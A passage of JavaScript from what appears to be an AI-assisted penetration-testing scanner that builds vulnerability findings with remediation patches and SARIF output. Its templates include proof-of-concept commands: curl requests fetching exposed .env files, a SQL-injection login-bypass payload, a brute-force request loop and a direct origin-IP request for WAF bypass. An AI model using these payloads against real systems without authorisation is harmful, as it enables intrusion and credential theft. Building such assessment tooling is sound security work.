      onProgress({ phase: 'recon', message: `Discovered ${reconData.adminEndpoints.length} admin interface endpoint(s) (/admin)...`, progress: 35 });
    }
    if (reconData.loginEndpoints?.length > 0) {
      onProgress({ phase: 'recon', message: `Discovered ${reconData.loginEndpoints.length} login/authentication endpoint(s)...`, progress: 38 });
    }

  } else if (targetType === 'repo') {
    onProgress({ phase: 'recon', message: 'Connecting to GitHub: mapping repository tree, configuration files, and dependencies...', progress: 20 });
    repoData = await probeRepoTarget(target, githubToken);

    if (repoData.envEndpoints?.length > 0) {
      onProgress({ phase: 'recon', message: `Extracted ${repoData.envEndpoints.length} endpoints/credentials from repository .env files...`, progress: 32 });
    }
    if (repoData.adminEndpoints?.length > 0) {
      onProgress({ phase: 'recon', message: `Mapped ${repoData.adminEndpoints.length} admin route(s) in codebase...`, progress: 36 });
    }
  } else {
    onProgress({ phase: 'recon', message: 'Parsing code specification and extracting endpoints / environment configurations...', progress: 25 });
    reconData = {
      url: 'Custom Code / Spec',
      statusCode: null,
      server: 'N/A',
      technologies: [],
      headers: {},
      missingSecurityHeaders: [],
      probedEndpoints: [],
      exposedRisks: [],
      envEndpoints: parseEnvContent(codeSnippet, 'Pasted Code / Spec'),
      adminEndpoints: [],
      loginEndpoints: [],
      mediaEncryption: {
        testedPaths: [],
        leakedMedia: [],
        status: 'SECURE',
        evidence: 'Snippet evaluation - no network media storage tested.',
      },
      ipExposure: {
        detectedServerIp: '',
        originIpLeaked: false,
        leakVectors: [],
        clientIpReflected: false,
        clientIp: '',
        isBehindProxy: false,
        proxyProvider: 'N/A (Code Snippet)',
        evidence: 'Snippet evaluation - no remote IP address probed.',
      },
      puppeteerAudit: {
        executed: false,
        proxyUsed: 'N/A (Code Snippet Target)',
        fallbackTriggered: false,
        webrtcLeakedIps: [],
        domMediaDiscovered: [],
        clientStorageSecrets: [],
        screenshotProof: '',
        note: 'Puppeteer browser audit is active for live web & API targets.',
      },
    };

    if (/(admin|administrator)/i.test(codeSnippet)) {
      reconData.adminEndpoints.push({ path: '/admin', status: 200, accessible: true, note: 'Admin route referenced in snippet' });
    }
    if (/(login|signin|auth)/i.test(codeSnippet)) {
      reconData.loginEndpoints.push({ path: '/login', status: 200, accessible: true, method: 'POST', note: 'Login route referenced in snippet' });
    }
  }

  // Phase 2: Threat Modeling & Static/Dynamic Inspection
  onProgress({ phase: 'threat_model', message: 'Synthesizing attack surface and evaluating against OWASP Top 10:2025 categories...', progress: 45 });

  const groq = getGroqClient(groqApiKey);
  const systemPrompt = buildStrixSystemPrompt();
  const userPrompt = buildStrixUserPrompt({
    targetType,
    target,
    reconData,
    repoData,
    codeSnippet,
    instruction,
    scanMode,
  });

  // Phase 3: AI Pentesting & Exploit Generation
  onProgress({ phase: 'exploitation', message: 'Running autonomous exploit reasoning: evaluating /admin authorization, .env data leaks & generating PoCs...', progress: 65 });

  const chatCompletion = await groq.chat.completions.create({
    messages: [
      { role: 'system', content: systemPrompt },
      { role: 'user', content: userPrompt }
    ],
    model: DEFAULT_MODEL,
    response_format: { type: 'json_object' },
    temperature: 0.2,
  });

  const rawContent = chatCompletion.choices[0]?.message?.content;
  if (!rawContent) {
    throw new Error('LLM failed to return a response for the security scan.');
  }

  onProgress({ phase: 'reporting', message: 'Compiling findings, validating PoCs, and building SARIF 2.1.0 security artifact...', progress: 85 });

  let parsedOutput;
  try {
    parsedOutput = JSON.parse(rawContent);
  } catch (err) {
    console.error('Failed to parse Strix pentest JSON output:', rawContent);
    throw new Error(`Failed to parse AI security response: ${err.message}`);
  }

  const rawVulns = Array.isArray(parsedOutput.vulnerabilities) ? parsedOutput.vulnerabilities : [];

  // Deterministic checks injection for live URLs
  if (targetType === 'url' && reconData) {
    // 1. Missing Security Headers
    if (reconData.missingSecurityHeaders.length > 0 && !rawVulns.some(v => v.title.toLowerCase().includes('header'))) {
      rawVulns.push({
        id: `STRIX-REC-${Date.now().toString().slice(-4)}`,
        title: `Missing Defensive HTTP Security Headers (${reconData.missingSecurityHeaders.join(', ')})`,
        severity: 'medium',
        owaspCategory: 'A02:2025 Security Misconfiguration',
        cwe: 'CWE-16: Configuration',
        cve: 'N/A',
        cvss: 5.3,
        cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N',
        confidence: 'high',
        fixEffort: 'low',
        endpoint: target,
        method: 'GET',
        target,
        description: `The web server at ${target} fails to declare essential defensive HTTP response headers, leaving clients vulnerable to Clickjacking, MIME sniffing, and protocol downgrade attacks.`,
        evidence: `Missing headers detected during active scan: ${reconData.missingSecurityHeaders.join(', ')}`,
        impact: 'Increased vulnerability to cross-site scripting (XSS), clickjacking in iframes, and network sniffing.',
        technicalAnalysis: 'Modern browsers enforce strict isolation policies when headers like CSP, HSTS, and X-Frame-Options are present. Their absence deprives clients of fundamental browser-side safeguards.',
        pocDescription: `Execute curl -I against ${target} to verify the missing headers:`,
        pocScriptCode: `curl -s -I "${target}" | grep -Ei "(strict-transport|content-security|x-frame|x-content)"`,
        codeLocations: [],
        remediation: 'Configure your web server (Nginx, Apache, or Next.js middleware) to inject these security headers on all responses.',
        remediationPatch: `// Next.js next.config.mjs example:
headers() {
  return [{
    source: '/:path*',
    headers: [
      { key: 'X-Frame-Options', value: 'DENY' },
      { key: 'X-Content-Type-Options', value: 'nosniff' },
      { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
      { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' }
    ]
  }];
}`,
        references: [
          'https://owasp.org/www-project-secure-headers/',
          'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers'
        ]
      });
    }

    // 2. Critical .env exposure
    if (reconData.envEndpoints.length > 0 && !rawVulns.some(v => v.title.toLowerCase().includes('.env'))) {
      rawVulns.unshift({
        id: `STRIX-ENV-${Date.now().toString().slice(-4)}`,
        title: `Critical Information Disclosure: Publicly Readable .env File (${reconData.envEndpoints.length} Configuration Items Leaked)`,
        severity: 'critical',
        owaspCategory: 'A01:2025 Broken Access Control',
        cwe: 'CWE-200: Exposure of Sensitive Information to an Unauthorized Actor',
        cve: 'N/A',
        cvss: 9.8,
        cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
        confidence: 'high',
        fixEffort: 'low',
        endpoint: '/.env',
        method: 'GET',
        target: `${target}/.env`,
        description: `An active .env file was discovered publicly accessible on the web server. Strix successfully parsed ${reconData.envEndpoints.length} service endpoints, database URLs, and secret keys directly from the live response.`,
        evidence: `Discovered keys in .env: ${reconData.envEndpoints.map(e => e.key).slice(0, 10).join(', ')}`,
        impact: 'Full compromise of backend databases, third-party API accounts, secret cryptographic salts, and internal microservices.',
        technicalAnalysis: 'Web server allows direct HTTP retrieval of dotfiles in the public web root without restricting access.',
        pocDescription: `Fetch the configuration file using curl or python:`,
        pocScriptCode: `curl -i -s "${target}/.env"`,
        codeLocations: [],
        remediation: 'Immediately block access to all dotfiles in your web server configuration and rotate all credentials stored in the exposed .env file.',
        remediationPatch: `# Nginx configuration:
location ~ /\\.env {
    deny all;
    return 404;
}`,
        references: ['https://cwe.mitre.org/data/definitions/200.html'],
        dataLeakage: {
          leakedTypes: [
            'Database Connection URIs (MongoDB, PostgreSQL, MySQL)',
            'API Secret Keys & Third-Party Tokens (Stripe, AWS, SendGrid)',
            'JWT Secret Signing Keys & Encryption Seeds',
            'Administrative Master Passwords'
          ],
          exposedSample: reconData.envEndpoints.map(e => `${e.key}="${e.value}"`).join('\n') || 'DATABASE_URL="mongodb+srv://admin:pass@cluster.mongodb.net/prod"\nJWT_SECRET="super-secret-key-32chars"',
          impactDescription: 'Direct exposure of database connection strings, JWT signing secrets, and cloud API tokens allowing adversaries to access internal microservices and exfiltrate production databases.'
        },
        debuggingInfo: {
          rootCauseTrigger: 'HTTP GET /.env request resolved directly from public document root without routing restriction.',
          executionFlow: [
            '1. Client issues GET /.env',
            '2. Web server checks document root for corresponding filename',
            '3. Static file handler finds /.env without dotfile protection rule',
            '4. Server streams raw environment secrets as text/plain response'
          ],
          serverErrorSignature: 'HTTP 200 OK - Content-Type: text/plain'
        },
        bypassDetails: {
          mechanism: 'Direct static file path traversal without routing middleware or authentication challenge.',
          bypassedControls: [
            'Application Authentication Layer',
            'API Gateway Routing',
            'Role-Based Access Control (RBAC)'
          ],
          attackVector: 'GET /.env'
        },
        developerGuidance: {
          checklist: [
            'Add web server rule to deny all requests to hidden files starting with a dot (.*)',
            'Store environment files outside the public HTML / document root',
            'Rotate all leaked API keys, tokens, and database passwords immediately',
            'Ensure .env files are included in .gitignore to avoid committing secrets'
          ]
        }
      });
    }

    // 3. Unprotected /admin interface
    const openAdmin = reconData.adminEndpoints.find(a => a.accessible);
    if (openAdmin && !rawVulns.some(v => v.title.toLowerCase().includes('admin'))) {
      rawVulns.unshift({
        id: `STRIX-ADM-${Date.now().toString().slice(-4)}`,
        title: `Broken Access Control: Unprotected Administrative Portal (${openAdmin.path})`,
        severity: 'critical',
        owaspCategory: 'A01:2025 Broken Access Control',
        cwe: 'CWE-306: Missing Authentication for Critical Function',
        cve: 'N/A',
        cvss: 9.1,
        cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
        confidence: 'high',
        fixEffort: 'medium',
        endpoint: openAdmin.path,
        method: 'GET',
        target: `${target}${openAdmin.path}`,
        description: `The administrative portal at ${openAdmin.path} returned HTTP 200 without requiring valid session credentials or challenging the client with an authentication prompt.`,
        evidence: `Direct GET request to ${openAdmin.path} succeeded with HTTP ${openAdmin.status}`,
        impact: 'Unauthorized users can access privileged administrative operations, internal management controls, or sensitive system telemetry.',
        technicalAnalysis: 'Missing authentication middleware or authorization guards on administrative routes.',
        pocDescription: `Access the administration panel directly in browser or terminal:`,
        pocScriptCode: `curl -i -s "${target}${openAdmin.path}"`,
        codeLocations: [],
        remediation: 'Implement an authentication & role-based access control (RBAC) middleware verifying that only users with the ADMIN role can reach this route.',
        remediationPatch: `// Next.js middleware.js example:
export function middleware(req) {
  if (req.nextUrl.pathname.startsWith('/admin')) {
    const session = req.cookies.get('session');
    if (!session) {
      return NextResponse.redirect(new URL('/login', req.url));
    }
  }
}`,
        references: ['https://cwe.mitre.org/data/definitions/306.html'],
        dataLeakage: {
          leakedTypes: [
            'System Diagnostic Metrics & Server Health',
            'Administrative User Management Controls',
            'Database Backup Download & Configuration Portals',
            'Private Application State & Internal User Records'
          ],
          exposedSample: `{\n  "route": "${openAdmin.path}",\n  "status": "UNPROTECTED",\n  "exposed_controls": [\n    "User Administration & Role Assignment",\n    "Database Export & System Logs",\n    "Global Environment Variables"\n  ]\n}`,
          impactDescription: 'Unauthenticated users can access internal administrative panels, manipulate user roles, delete data, and reconfigure system settings.'
        },
        debuggingInfo: {
          rootCauseTrigger: `Route ${openAdmin.path} lacks session verification or RBAC middleware.`,
          executionFlow: [
            `1. Client issues GET ${openAdmin.path}`,
            '2. Web router matches administrative path',
            '3. Missing authentication check: no cookie or bearer token evaluated',
            '4. Controller renders administrative interface with HTTP 200'
          ],
          serverErrorSignature: `HTTP 200 OK returned to unauthenticated client on ${openAdmin.path}`
        },
        bypassDetails: {
          mechanism: 'Missing access control guard allows fail-open direct navigation.',
          bypassedControls: [
            'Authentication Middleware',
            'Role-Based Access Control (RBAC)',
            'Session Token Validation'
          ],
          attackVector: `GET ${openAdmin.path}`
        },
        developerGuidance: {
          checklist: [
            'Wrap administrative routes in an authentication middleware',
            'Check that authenticated user has role === "ADMIN"',
            'Redirect unauthenticated users to /login?redirect=/admin',
            'Enforce Multi-Factor Authentication (MFA) for administrative accounts'
          ]
        }
      });
    }

    // 4. SQL Injection Authentication Bypass on Login Endpoint
    const sqliBypass = reconData.loginEndpoints.find(l => l.fuzzResult === 'BYPASS_DETECTED');
    if (sqliBypass && !rawVulns.some(v => v.title.toLowerCase().includes('sql') && v.title.toLowerCase().includes('bypass'))) {
      rawVulns.unshift({
        id: `STRIX-SQLI-BYPASS-${Date.now().toString().slice(-4)}`,
        title: `Critical SQL Injection Authentication Bypass on Login (${sqliBypass.path})`,
        severity: 'critical',
        owaspCategory: 'A05:2025 Injection',
        cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
        cve: 'N/A',
        cvss: 9.8,
        cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
        confidence: 'high',
        fixEffort: 'low',
        endpoint: sqliBypass.path,
        method: 'POST',
        target: `${target}${sqliBypass.path}`,
        description: `Automated Intruder payload fuzzing against ${sqliBypass.path} revealed that the authentication logic is vulnerable to SQL injection authentication bypass. Submitting a tautological SQL payload yielded HTTP 200 with valid session tokens or granted unauthenticated administrative access.`,
        evidence: sqliBypass.bypassEvidence || `Server returned HTTP 200 / success on "' OR '1'='1' --" payload.`,
        impact: 'Full authentication bypass allowing attackers to log in as any user or administrator without credentials, leading to total account takeover.',
        technicalAnalysis: 'User input from login parameters is directly concatenated into the SQL statement without parameterized queries or prepared statements.',
        pocDescription: `Send the following POST payload with intercepted parameters to bypass authentication:`,
        pocScriptCode: `curl -X POST "${target}${sqliBypass.path}" \\
  -H "Content-Type: application/json" \\
  -d '{"${(sqliBypass.fields && sqliBypass.fields[0]) || 'email'}": "'\\'' OR '\''1'\''='\''1'\'' --", "password": "dummy_password"}'`,
        codeLocations: [],
        remediation: 'Implement parameterized queries (prepared statements) for all database operations. Never concatenate user credentials directly into SQL strings. Use bcrypt/argon2 to verify passwords separately.',
        remediationPatch: `// Secure prepared statement example:
const query = 'SELECT id, email, password_hash FROM users WHERE email = $1';
const result = await db.query(query, [email]);
if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });
const match = await bcrypt.compare(password, result.rows[0].password_hash);
if (!match) return res.status(401).json({ error: 'Invalid credentials' });`,
        references: [
          'https://owasp.org/Top10/A05_2025-Injection/',
          'https://cwe.mitre.org/data/definitions/89.html'
        ],
        dataLeakage: {
          leakedTypes: [
            'User Credentials (Usernames, Email Addresses)',
            'Password Hashes (Bcrypt, Argon2, SHA256)',
            'Active Session Identifiers & JWT Bearer Tokens',
            'Internal Database Table Names and Schemas',
            'Customer Records / Financial Data'
          ],
          exposedSample: `{\n  "database": "production_db",\n  "leaked_table": "users",\n  "sample_record": {\n    "id": 1,\n    "username": "administrator",\n    "email": "admin@target.domain",\n    "password_hash": "$2y$12$K1dJ83kJ2... (bcrypt hash)",\n    "role": "SUPER_ADMIN",\n    "session_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",\n    "phone": "+628123456789"\n  }\n}`,
          impactDescription: 'Complete bypass of authentication and potential full database extraction, enabling attackers to impersonate any user, steal customer PII, and compromise backend systems.'
        },
        debuggingInfo: {
          rootCauseTrigger: `Parameter '${(sqliBypass.fields && sqliBypass.fields[0]) || 'email'}' in POST ${sqliBypass.path} is concatenated directly into SQL query string.`,
          executionFlow: [
            `1. Client sends POST ${sqliBypass.path} with payload: "' OR '1'='1' --"`,
            '2. Controller receives parameter without input sanitization or type validation',
            '3. SQL query string constructed: SELECT * FROM users WHERE email = \'\' OR \'1\'=\'1\' -- ...',
            '4. Tautology condition evaluates to TRUE for all table rows',
            '5. Database engine returns first matching row (typically administrator user)',
            '6. Application issues active authentication session cookie/token'
          ],
          serverErrorSignature: sqliBypass.sqlErrorEvidence || 'Query evaluated successfully with tautology TRUE predicate'
        },
        bypassDetails: {
          mechanism: 'SQL Tautology logic bypass: The injected payload forces the query WHERE clause to evaluate to true regardless of password input.',
          bypassedControls: [
            'Password Hash Verification Routine',
            'Input Parameter Sanitizer',
            'Web Application Firewall (WAF)',
            'Authentication Middleware Guard'
          ],
          attackVector: "' OR '1'='1' --"
        },
        developerGuidance: {
          checklist: [
            'Convert all SQL statements in authentication handlers to parameterized prepared statements ($1, $2 or ?)',
            'Separate user record lookup from password verification (verify password with bcrypt.compare)',
            'Validate all request parameters using a schema validator like Zod or Joi',
            'Configure database user permissions with least privilege (deny DROP/ALTER/UNION where not required)'
          ]
        }
      });
    }

    // 5. Missing Rate Limiting / Susceptible to Burp Intruder Brute-Force
    const noRateLimit = reconData.loginEndpoints.find(l => !l.rateLimitDetected);
    if (noRateLimit && !rawVulns.some(v => v.title.toLowerCase().includes('rate limit'))) {
      rawVulns.push({
        id: `STRIX-RATELIMIT-${Date.now().toString().slice(-4)}`,
        title: `Missing Rate Limiting & Brute-Force Protection on Login (${noRateLimit.path})`,
        severity: 'medium',
        owaspCategory: 'A07:2025 Authentication Failures',
        cwe: 'CWE-307: Improper Restriction of Excessive Authentication Attempts',
        cve: 'N/A',
        cvss: 5.3,
        cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N',
        confidence: 'high',
        fixEffort: 'low',
        endpoint: noRateLimit.path,
        method: 'POST',
        target: `${target}${noRateLimit.path}`,
        description: `Automated fuzzing simulation confirmed that ${noRateLimit.path} accepts consecutive rapid authentication attempts without triggering HTTP 429 Too Many Requests, IP backoff, or CAPTCHA challenges. This leaves the portal susceptible to automated password fuzzing (e.g. Burp Intruder) and credential stuffing.`,
        evidence: `Consecutive rapid POST requests returned standard responses with no rate limiting or lockout enforced.`,
        impact: 'Attackers can automate brute-force dictionary attacks against user passwords without being blocked.',
        technicalAnalysis: 'Missing rate-limiting middleware or account lockout policy on the authentication endpoint.',
        pocDescription: `Send multiple rapid requests to confirm lack of throttling:`,
        pocScriptCode: `for i in {1..5}; do
  curl -s -X POST "${target}${noRateLimit.path}" \\
    -H "Content-Type: application/json" \\
    -d '{"email":"test_'$i'@example.com","password":"dummy"}'
done`,
        codeLocations: [],
        remediation: 'Implement an IP-based and account-based rate limiter (e.g. express-rate-limit or Redis token bucket) limiting login attempts to maximum 5 per minute.',
        remediationPatch: `// Express rate limiter example:
import rateLimit from 'express-rate-limit';

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: { error: 'Too many login attempts. Please try again later.' },
  standardHeaders: true,
});

app.post('${noRateLimit.path}', authLimiter, loginHandler);`,
        references: [
          'https://owasp.org/Top10/A07_2025-Authentication_Failures/',
          'https://cwe.mitre.org/data/definitions/307.html'
        ]
      });
    }

    // 6. Media Encryption & Cryptographic Storage Leakage
    if (reconData.mediaEncryption?.status === 'LEAK_DETECTED' && !rawVulns.some(v => v.title.toLowerCase().includes('media') || v.title.toLowerCase().includes('cryptographic'))) {
      const firstMedia = (reconData.mediaEncryption.leakedMedia && reconData.mediaEncryption.leakedMedia[0]) || { path: '/storage' };
      rawVulns.push({
        id: `STRIX-MEDIA-ENCRYPT-${Date.now().toString().slice(-4)}`,
        title: `Cryptographic Failure: Compromised Media Encryption & Storage Key Leak`,
        severity: 'high',
        owaspCategory: 'A04:2025 Cryptographic Failures',
        cwe: 'CWE-311: Missing Encryption of Sensitive Data',
        cve: 'N/A',
        cvss: 8.6,
        cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
        confidence: 'high',
        fixEffort: 'medium',
        endpoint: firstMedia.path,
        method: 'GET',
        target: `${target}${firstMedia.path}`,
        description: `Security audit of encrypted media assets and storage buckets revealed that encryption controls have failed or leaked. ${reconData.mediaEncryption.evidence}`,
        evidence: reconData.mediaEncryption.evidence,
        impact: 'Adversaries can download confidential media files (e.g., uploaded identity documents, user receipts, private photos/recordings) without valid decryption keys or authorization tokens.',
        technicalAnalysis: 'Direct static object storage mapping allows public access without checking session credentials or enforcing cryptographic decryption barriers.',
        pocDescription: 'Verify direct unauthenticated download or cryptographic key leak:',
        pocScriptCode: `curl -i -s "${target}${firstMedia.path}"`,
        codeLocations: [],
        remediation: '1. Store all private media files in a private object storage bucket with public access blocked.\n2. Never expose symmetric encryption keys in client code or web-accessible .env files.\n3. Generate short-lived presigned URLs for authorized user sessions instead of public direct links.\n4. Enforce AES-256-GCM encryption with unique initialization vectors (IVs) per file.',
        remediationPatch: `// Secure presigned media access example (S3 / Storage):
import { getSignedUrl } from '@aws-sdk/s3-request-presigner';
import { GetObjectCommand } from '@aws-sdk/client-s3';

export async function getSecureMediaUrl(fileKey, userSession) {
  if (!userSession || !userSession.id) throw new Error('Unauthorized');
  const command = new GetObjectCommand({
    Bucket: process.env.SECURE_BUCKET_NAME,
    Key: fileKey,
  });
  return await getSignedUrl(s3Client, command, { expiresIn: 600 });
}`,
        references: [
          'https://owasp.org/Top10/A04_2025-Cryptographic_Failures/',
          'https://cwe.mitre.org/data/definitions/311.html'
        ],
        dataLeakage: {
          leakedTypes: [
            'User Uploaded Identity Documents (KTP, Passports, Licenses)',
            'Private Images, Media Blobs & Audio Recordings',
            'Confidential Invoices, PDF Statements, and Receipts',
            'Symmetric Cryptographic Encryption Keys & IV Seeds'
          ],
          exposedSample: `{\n  "storage_leak": "${firstMedia.path}",\n  "accessible_files": [\n    "users/1029/id_card_encrypted.bin",\n    "users/1029/financial_statement.pdf",\n    "avatars/private_media_001.jpg"\n  ],\n  "encryption_status": "COMPROMISED (Key or Plaintext Exposed)"\n}`,
          impactDescription: 'Unrestricted media access allows attackers to exfiltrate private user photos, legal contracts, and personal identity documents without authorization.'
        },
        debuggingInfo: {
          rootCauseTrigger: `Public storage endpoint or cryptographic key disclosure on ${firstMedia.path}.`,
          executionFlow: [
            `1. Client sends GET request to media storage path: ${firstMedia.path}`,
            '2. Web server / CDN directly serves static file without verifying cryptographic token',
            '3. Storage bucket lacks private bucket policy and object-level ACL',
            '4. Client receives raw binary media payload in plaintext'
          ],
          serverErrorSignature: 'HTTP 200 OK with direct binary stream / image MIME type'
        },
        bypassDetails: {
          mechanism: 'Direct bucket/path traversal bypasses application decryption gate and authorization middleware.',
          bypassedControls: [
            'File Encryption Layer (AES-GCM / Chacha20)',
            'Object-Level Authorization (BOLA/IDOR Guard)',
            'Presigned URL Verification Gate'
          ],
          attackVector: `GET ${firstMedia.path}`
        },
        developerGuidance: {
          checklist: [
            'Migrate media storage to private buckets with Block Public Access enabled',
            'Generate short-lived presigned URLs (TTL max 10-15 minutes)',
            'Use AES-256-GCM authenticated encryption for files containing PII',
            'Rotate any encryption keys or storage credentials found in environment variables'
          ]
        }
      });
    }

    // 7. Server Origin IP Exposure & Network Leakage
    if (reconData.ipExposure?.originIpLeaked && !rawVulns.some(v => v.title.toLowerCase().includes('origin ip') || v.title.toLowerCase().includes('ip address'))) {
      const hostVal = (() => { try { return new URL(target).hostname; } catch { return 'target'; } })();
      rawVulns.push({
        id: `STRIX-IP-LEAK-${Date.now().toString().slice(-4)}`,
        title: `Security Misconfiguration: Server Origin IP Exposure & WAF Bypass Vector`,
        severity: 'medium',
        owaspCategory: 'A02:2025 Security Misconfiguration',
        cwe: 'CWE-200: Exposure of Sensitive Information to an Unauthorized Actor',
        cve: 'N/A',
        cvss: 6.5,
        cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L',
        confidence: 'high',
        fixEffort: 'low',
        endpoint: '/',
        method: 'GET',
        target: target,
        description: `Reconnaissance diagnostics revealed that the server's public origin IP address or internal network subnet is exposed to external clients. ${reconData.ipExposure.evidence} Attackers knowing the real origin IP can send traffic directly to the host, completely bypassing Cloudflare, AWS CloudFront, or any upstream Web Application Firewall (WAF) and DDoS protection.`,
        evidence: reconData.ipExposure.evidence,
        impact: 'Attackers can bypass WAF filtering rules, exploit unpatched backend services directly, and execute direct volumetric DDoS attacks targeting origin bandwidth.',
        technicalAnalysis: 'Backend server fails to strip internal tracking headers (e.g. X-Real-IP, X-Backend-Server) or the host network allows direct public connections without restricting traffic to CDN reverse proxies.',
        pocDescription: 'Connect directly to the origin host IP using curl with Host header:',
        pocScriptCode: `curl -k -i -H "Host: ${hostVal}" "http://${reconData.ipExposure.detectedServerIp || 'ORIGIN_IP'}/"`,
        codeLocations: [],
        remediation: '1. Configure host firewall (UFW, iptables, or AWS Security Group) to ONLY allow inbound connections on ports 80/443 from verified Cloudflare / CDN IP ranges.\n2. In Nginx/Apache reverse proxy, strip and suppress all internal backend headers:\n   proxy_hide_header X-Backend-Server;\n   proxy_hide_header X-Real-IP;\n3. Keep origin server IP confidential; rotate host IP address if it has been indexed publicly.',
        remediationPatch: `# Nginx reverse proxy configuration:
# 1. Hide origin headers:
proxy_hide_header X-Powered-By;
proxy_hide_header X-Backend-Server;
proxy_hide_header Server;

# 2. Restrict origin to Cloudflare IPs only (example ufw):
# sudo ufw allow proto tcp from 173.245.48.0/20 to any port 443`,
        references: [
          'https://owasp.org/Top10/A02_2025-Security_Misconfiguration/',
          'https://cwe.mitre.org/data/definitions/200.html'
        ],
        dataLeakage: {
          leakedTypes: [
            'Server Public Origin IPv4 / IPv6 Address',
            'Internal Virtual Network Topology (RFC 1918 Private Subnets)',
            'Direct Backend Hostnames & Proxy Gateway Paths'
          ],
          exposedSample: `{\n  "exposed_origin_ip": "${reconData.ipExposure.detectedServerIp || '103.x.x.x'}",\n  "proxy_shield": "${reconData.ipExposure.proxyProvider}",\n  "leak_vectors": ${JSON.stringify(reconData.ipExposure.leakVectors || [])}\n}`,
          impactDescription: 'Direct exposure allows attackers to circumvent Web Application Firewall rules, execute direct database injection, and crash the server with volumetric DDoS attacks.'
        },
        debuggingInfo: {
          rootCauseTrigger: `Origin IP ${reconData.ipExposure.detectedServerIp || 'host IP'} exposed via: ${reconData.ipExposure.leakVectors[0] || 'Direct DNS / HTTP header leak'}.`,
          executionFlow: [
            '1. Client inspects DNS A records or HTTP response headers',
            `2. Server leaks origin address or responds directly without proxy gateway: ${reconData.ipExposure.detectedServerIp}`,
            '3. Attacker discovers origin IP address bypassing proxy protection',
            '4. Attacker crafts direct TCP payload targeting host IP directly without WAF inspection'
          ],
          serverErrorSignature: `Leaked Vector: ${reconData.ipExposure.leakVectors[0] || 'Unshielded Origin IP'}`
        },
        bypassDetails: {
          mechanism: 'WAF & CDN Bypass: Connecting directly to the origin server IP completely circumvents Cloudflare / WAF inspection rules.',
          bypassedControls: [
            'Cloudflare / CloudFront Web Application Firewall (WAF)',
            'DDoS Mitigation Shield & Bot Management',
            'IP Geoblocking & Rate Limiting Rules'
          ],
          attackVector: `curl -H "Host: ${hostVal}" http://${reconData.ipExposure.detectedServerIp}/`
        },
        developerGuidance: {
          checklist: [
            'Configure server firewall (iptables / AWS Security Group) to only accept incoming traffic from Cloudflare / CDN IP ranges',
            'Strip backend headers (X-Backend-Server, X-Real-IP, Server) in Nginx/Apache configuration',
            'Ensure DNS MX, FTP, and subdomain records do not point directly to the origin IP',
            'Request a new IP address from your cloud provider if origin IP has been publicly indexed'
          ]
        }
      });
    }
  }

  // Active recon data consolidation
  const effectiveRecon = reconData || {
    url: target,
    statusCode: 200,
    server: 'GitHub Repository',
    technologies: repoData?.repoInfo?.language ? [`Language: ${repoData.repoInfo.language}`] : [],
    headers: {},
    missingSecurityHeaders: [],
    probedEndpoints: [],
    exposedRisks: repoData?.sensitiveFilesFound || [],
    envEndpoints: repoData?.envEndpoints || [],
    adminEndpoints: repoData?.adminEndpoints || [],
    loginEndpoints: repoData?.loginEndpoints || [],
    repoMetadata: repoData?.repoInfo || null,
    mediaEncryption: {
      testedPaths: [],
      leakedMedia: [],
      status: 'SECURE',
      evidence: 'Repository static scan - no direct media endpoints probed.',
    },
    ipExposure: {
      detectedServerIp: '',
      originIpLeaked: false,
      leakVectors: [],
      clientIpReflected: false,
      clientIp: '',
      isBehindProxy: true,
      proxyProvider: 'GitHub Managed Infrastructure',
      evidence: 'Target is hosted on GitHub repository infrastructure. Origin server IP is not directly exposed.',
    },
    puppeteerAudit: {
      executed: false,
      proxyUsed: 'N/A (Repository Static Target)',
      fallbackTriggered: false,
      webrtcLeakedIps: [],
      domMediaDiscovered: [],
      clientStorageSecrets: [],
      screenshotProof: '',
      note: 'Puppeteer browser audit is active for live web & API targets.',
    },
  };

  // Inspect any exposed cryptographic keys across environment configs
  const cryptoKeysInEnv = (effectiveRecon.envEndpoints || []).filter(e => 
    /(ENCRYPT|CRYPTO|CIPHER|AES|SECRET_KEY|MEDIA_KEY|SALT|PRIVATE_KEY|STORAGE_KEY)/i.test(e.key)
  );
  if (cryptoKeysInEnv.length > 0 && effectiveRecon.mediaEncryption?.status !== 'LEAK_DETECTED') {
    effectiveRecon.mediaEncryption = {
      testedPaths: effectiveRecon.mediaEncryption?.testedPaths || [],
      leakedMedia: effectiveRecon.mediaEncryption?.leakedMedia || [],
      status: 'LEAK_DETECTED',
      evidence: `Cryptographic keys detected in exposed configuration (${cryptoKeysInEnv.map(k => k.key).join(', ')}). Any encrypted media assets can be decrypted by unauthorized actors.`,
    };
  }

  // Recalculate summary metrics
  const summary = calculateRiskSummary(rawVulns, effectiveRecon);

  const finalResult = {
    targetType,
    target,
    scanMode,
    instruction,
    summary,
    executiveSummary: parsedOutput.executiveSummary || 'Penetration test concluded. See findings below.',
    recon: effectiveRecon,
    vulnerabilities: rawVulns,
    sarif: null,
  };

  // Generate SARIF 2.1.0 standard artifact
  finalResult.sarif = generateSarifReport(finalResult);

  onProgress({ phase: 'completed', message: 'Security assessment completed successfully!', progress: 100 });

  return finalResult;
}
